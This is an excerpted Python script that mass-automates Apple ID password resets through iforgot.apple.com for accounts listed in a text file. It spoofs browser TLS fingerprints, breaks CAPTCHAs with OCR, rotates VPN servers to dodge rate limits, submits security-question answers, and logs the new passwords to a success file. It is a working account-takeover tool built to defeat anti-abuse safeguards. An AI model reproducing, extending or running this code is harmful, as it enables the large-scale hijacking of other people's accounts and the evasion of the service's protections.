...
import ddddocr
import base64 # Import base64 for decoding image
...
class unlocker:
    ...
    def unlock(self, data_email):
        try:
            start = time.time()
            # self.key = settings["API_KEY"] # Removed yescaptcha API Key
            ...
            self.session = tls_client.Session(
                random_tls_extension_order=True, client_identifier="chrome_128"
            )
            ...
            sendForget = self.session.get(
                "https://iforgot.apple.com/password/verify/appleid",
                headers=self.headers,
            )
            self.sstt = urllib.parse.quote(
                sendForget.text.split(
                    '"https://iforgot.apple.com","contextUrl":"/","sstt":"'
                )[1].split('","captchaEnabled":true,')[0]
            )

            """ * Set Headers * """

            self.headers["cookie"] = "; ".join(
                [f"{name}={value}" for name, value in sendForget.cookies.items()]
            )
            self.headers["sstt"] = self.sstt
            self.headers["accept"] = "application/json, text/javascript, */*; q=0.01"
            self.headers["x-requested-with"] = "XMLHttpRequests"
            self.headers["x-apple-i-fd-client-info"] = (
                '{"U":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","L":"en-US","Z":"GMT+02:00","V":"1.1","F":"sla44j1e3NlY5BNlY5BSs5uQ084akLK77J_v495JppM.S9RdPQSzOy_Aw7UTlWY5Ly.eaB0Tf0IY69WJQStMw8btHz3Y25BNlY5cklY5BqNAE.lTjV.6KH"}'
            )

            """ * Get Captcha INFO * """
            ocr = ddddocr.DdddOcr() # Initialize ddddocr here, outside the loop for efficiency
            while True:
                sendCaptcha = self.session.get(
                ...
                img_bytes = base64.b64decode(self.capImg) # Decode base64 image
                captcha_text = ocr.classification(img_bytes) # Solve captcha with ddddocr
                ...
                data = {
                    ...
                    "captcha": {
                        "id": self.id,
                        "answer": captcha_text, # Use ddddocr solution
                        "token": self.token,
                    },
                }

                sendAppleid = self.session.post(
                    "https://iforgot.apple.com/password/verify/appleid",
                    headers=self.headers,
                    json=data,
                )
                ...
                if "captchaAnswer.Invalid" in sendAppleid.text:
                    print(f"{Fore.YELLOW} [ ! ] Invalid Captcha Answer, Retrying...")
                    pass # Retry captcha if invalid
                    ...
                    with ExpressVpnApi() as api:
                        ...
                        api.connect(ran)
                    print(
                        f"{Fore.GREEN} [ + ] VPN was Changed Successfuly===> retrying "
                    )
                    time.sleep(10)
                    pass
            ...
            if sendAppleid.status_code == 302:
                ...
                sendSSTT = self.session.get(
                    f"https://iforgot.apple.com{sendAppleid.headers['Location']}",
                    headers=self.headers,
                )

                """ * Send authenticationmethod * """

                sendAuthenticationmethod = self.session.post(
                    f"https://iforgot.apple.com{sendSSTT.headers['Location']}",
                    headers=self.headers,
                    json={"type": "questions"},
                )
                ...
                sendBirthdayGET = self.session.get(
                    f"https://iforgot.apple.com{sendAuthenticationmethod.headers['Location']}",
                    headers=self.headers,
                )
                ...
                sendBirthdayPOST = self.session.post(
                ...
                if sendBirthdayPOST.status_code == 410:
                    print(
                        f"{Fore.RED} [ + ] {self.email} ==> ERROR While unlock ==> TO many Attempts ERORR"
                    )
                ...
                """ * Get Questions * """
                sendQuestionsGET = self.session.get(
                    f"https://iforgot.apple.com{sendBirthdayPOST.headers['Location']}",
                    headers=self.headers,
                )
                ...
                sendQuestionsPOST = self.session.post(
                ...
                if sendQuestionsPOST.status_code == 400:
                    print(
                        f"{Fore.RED} [ + ] {self.email} ==> ERROR While unlock ==> INVAILD questions"
                    )
                    remove_line_containing_text("files/Accounts.txt", data_email)
                    with lock:
                        with open("files/error.txt", "a+") as f:
                ...
                if sendAppleid.status_code == 302:
                    """ * Send Options * """
                    sendOptionsGET = self.session.get(
                        f"https://iforgot.apple.com{sendQuestionsPOST.headers['Location']}",
                        headers=self.headers,
                    )

                    """ * Send reset * """
                    sendResetGET = self.session.get(
                        f"https://iforgot.apple.com{sendOptionsGET.headers['Location']}",
                        headers=self.headers,
                    )
                    self.headers["sstt"] = sendResetGET.headers["Sstt"]

                    """ * RESET PASSWORD * """
                    sendResetPassword = self.session.post(
                    ...
                    if sendResetPassword.status_code == 260:
                        ...
                        print(
                            f"{Fore.GREEN} [ + ] {self.email} ==> Was Unlocked Successfuly in ==> {time_}s "
                        )
                        remove_line_containing_text("files/Accounts.txt", data_email)
                        with lock:
                            with open("files/Success.txt", "a+") as f:
                                f.write(
                                    f"{self.data_email.replace(self.password, self.new_password)}\n"
                                )
                    else:
                        print(
                            f"{Fore.RED} [ + ] {self.email} ==> ERROR While unlock ==>"
                        )
                        remove_line_containing_text("files/Accounts.txt", data_email)
                        with lock:
                            with open("files/error.txt", "a+") as f:
...
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [
        executor.submit(unlocker().unlock, emails)
        for emails in open("files/Accounts.txt").read().splitlines()
    ]
